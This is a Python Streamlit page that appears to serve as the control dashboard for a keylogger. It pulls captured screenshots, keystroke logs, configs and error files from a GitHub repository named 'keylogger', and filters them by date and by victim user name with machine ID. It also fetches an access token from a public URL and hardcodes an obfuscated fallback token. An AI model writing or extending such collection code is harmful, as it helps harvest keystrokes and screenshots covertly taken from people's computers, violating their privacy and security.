# download files from github repo

import re
import os
import ast
import json
import time
import hashlib
import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime
from PIL import Image, ImageFile
from streamlit_image_zoom import image_zoom
from zoneinfo import ZoneInfo  # Python 3.9+


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

# Your GitHub Personal Access Token
DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/screenshots/"
CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
KEYLOGERROR_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/keylogerror"
LOGS_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"

cache_time = 90  # Cache time in seconds

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "delete" key exists
            if "delete" in token_data:
                token = token_data["delete"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'delete' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")


# Maximum number of retries for file download
MAX_RETRIES = 3

# GitHub API base URL
GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads"

# GitHub repository folders to check
FOLDERS = {
    "cache": "cache",
    "config": "config",
    "keylogerror": "keylogerror",
    "logs": "logs",
    "screenshots": "screenshots",
}

# Function to get the list of files in a folder
@st.cache_data(ttl=cache_time)
def get_number_of_files(folder):
    url = f"{GITHUB_API_BASE_URL}/{folder}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        files = response.json()
        return files  # Return the list of files
    else:
        st.error(f"Failed to fetch data for {folder}: {response.status_code}")
        return []

# Folder to store downloaded files
DOWNLOAD_FOLDER = "downloads_activity"

# Create the download folder if it doesn't exist
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

# Function to extract unique user name from filename
@st.cache_data(ttl=cache_time)
def extract_unique_user_name(file_name):
    try:
        # Extract unique user name from filename (e.g., "bibek_4C4C4544-0033-3910-804A-B3C04F324233")
        return "_".join(file_name.split("_")[2:4])  # "bibek_4C4C4544-0033-3910-804A-B3C04F324233"
    except (IndexError, ValueError):
        return None


# Function to parse date and time from filename
@st.cache_data(ttl=cache_time)
def parse_datetime_from_filename(file_name):
    try:
        # Extract date and time from filename (e.g., "20250129_090616_bibek_...")
        date_str = file_name.split("_")[0]  # "20250129"
        time_str = file_name.split("_")[1]  # "090616"
        return datetime.strptime(f"{date_str} {time_str}", "%Y%m%d %H%M%S")
    except (IndexError, ValueError):
        return None

# Function to download files with advanced options
@st.cache_data(ttl=cache_time)
def download_files_advanced(folder, terminal_placeholder, start_date=None, end_date=None, num_files=None, unique_user_name=None):
    files = get_number_of_files(folder)
    if not files:
        return

    # Initialize or update the session state for logs
    if "download_logs" not in st.session_state:
        st.session_state.download_logs = "Download Log:\n"

    # Filter files by date and time range
    filtered_files = []
    for file in files:
        file_name = file["name"]
        file_datetime = parse_datetime_from_filename(file_name)

        if start_date and end_date and file_datetime:
            if not (start_date <= file_datetime <= end_date):
                continue  # Skip files outside the date range

        # Filter files by unique user name
        if unique_user_name:
            file_user_name = extract_unique_user_name(file_name)
            if file_user_name != unique_user_name:
                continue  # Skip files that don't match the unique user name

        filtered_files.append(file)

    # Sort files in reverse order (from last to first)
    filtered_files.sort(key=lambda x: x["name"], reverse=True)

    # Limit the number of files to download
    if num_files:
        filtered_files = filtered_files[:num_files]

    # Download the filtered files
    for file in filtered_files:
        file_name = file["name"]
        file_url = file["download_url"]

        # Download the file
        response = requests.get(file_url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
        if response.status_code == 200:
            # Save the file in the download folder
            file_path = os.path.join(DOWNLOAD_FOLDER, file_name)
            with open(file_path, "wb") as f:
                f.write(response.content)
            st.session_state.download_logs = f"Downloaded: {file_path}\n{st.session_state.download_logs}"
        else:
            st.session_state.download_logs = f"Failed to download: {file_name}\n{st.session_state.download_logs}"

        # Update the terminal-like box
        terminal_placeholder.markdown(
            f"""
            <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                <pre>{st.session_state.download_logs}</pre>
            </div>
            """,
            unsafe_allow_html=True
        )


def main():
    st.header("Download Files")
    st.write("Choose an action and configure the options below.")        # Advanced options for downloading files
    download_by_date = st.checkbox("Download Files within Date and Time Range")
    download_by_num_files = st.checkbox("Download a Specific Number of Files")
    download_by_user_name = st.checkbox("Download Files by Unique User Name")
    # Folder-specific options for downloading files
    download_folder_options = {}
    for folder_name, folder_path in FOLDERS.items():
        with st.expander(f"Folder: {folder_path}"):
            # Start Date and Start Time in the same row
            col1, col2 = st.columns(2)
            with col1:
                start_date = st.text_input(f"Start Date (YYYYMMDD) for {folder_name}", key=f"download_start_date_{folder_name}")
            with col2:
                start_time = st.text_input(f"Start Time (HHMMSS) for {folder_name}", key=f"download_start_time_{folder_name}")
            # End Date and End Time in the same row
            col3, col4 = st.columns(2)
            with col3:
                end_date = st.text_input(f"End Date (YYYYMMDD) for {folder_name}", key=f"download_end_date_{folder_name}")
            with col4:
                end_time = st.text_input(f"End Time (HHMMSS) for {folder_name}", key=f"download_end_time_{folder_name}")
            # Number of Files and Unique User Name
            if download_by_num_files:
                num_files = st.number_input(f"Number of Files to Download for {folder_name}", min_value=1, key=f"download_num_files_{folder_name}")
            else:
                num_files = None
            if download_by_user_name:
                unique_user_name = st.text_input(f"Unique User Name for {folder_name}", key=f"download_unique_user_name_{folder_name}")
            else:
                unique_user_name = None
            # Store options in folder-specific dictionary
            download_folder_options[folder_name] = {
                "start_date": start_date,
                "start_time": start_time,
                "end_date": end_date,
                "end_time": end_time,
                "num_files": num_files,
                "unique_user_name": unique_user_name
            }
    # Download button for advanced options
    if st.button("Download Files with Advanced Options"):
        if download_by_date or download_by_num_files or download_by_user_name:
            # Create a terminal-like output box
            terminal_placeholder = st.empty()
            terminal_placeholder.markdown(
                f"""
                <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                    <pre>Download Log:</pre>
                </div>
                """,
                unsafe_allow_html=True
            )
            # Initialize or update the session state for download logs
            if "download_logs" not in st.session_state:
                st.session_state.download_logs = "Download Log:\n"
            # Perform download for each folder
            for folder_name, folder_path in FOLDERS.items():
                # Get folder-specific options
                start_date_str = download_folder_options[folder_name]["start_date"]
                start_time_str = download_folder_options[folder_name]["start_time"]
                end_date_str = download_folder_options[folder_name]["end_date"]
                end_time_str = download_folder_options[folder_name]["end_time"]
                num_files = download_folder_options[folder_name]["num_files"]
                unique_user_name = download_folder_options[folder_name]["unique_user_name"]
                # Parse date and time range for the folder
                if download_by_date:
                    if not start_date_str or not start_time_str or not end_date_str or not end_time_str:
                        st.warning(f"Skipping download for {folder_name} because date/time fields are incomplete.")
                        continue
                    try:
                        start_date = datetime.strptime(f"{start_date_str} {start_time_str}", "%Y%m%d %H%M%S")
                        end_date = datetime.strptime(f"{end_date_str} {end_time_str}", "%Y%m%d %H%M%S")
                    except ValueError:
                        st.error(f"Invalid date or time format for {folder_name}. Please use YYYYMMDD for dates and HHMMSS for times.")
                        continue
                else:
                    start_date = end_date = None
                # Skip download if no advanced options are selected for this folder
                if not download_by_date and not download_by_num_files and not download_by_user_name:
                    continue
                # Download files with advanced options
                download_files_advanced(folder_path, terminal_placeholder, start_date, end_date, num_files, unique_user_name)
            st.success("Download completed!")
        else:
            st.warning("No advanced options selected.")


# Streamlit app
st.set_page_config(page_title="Download Files", layout="wide", page_icon=":⬇️:")


# app logic to authenticate user
if st.session_state["authenticated"]:
    main()
else:
    st.error("Please login (Homepage) to access this page.")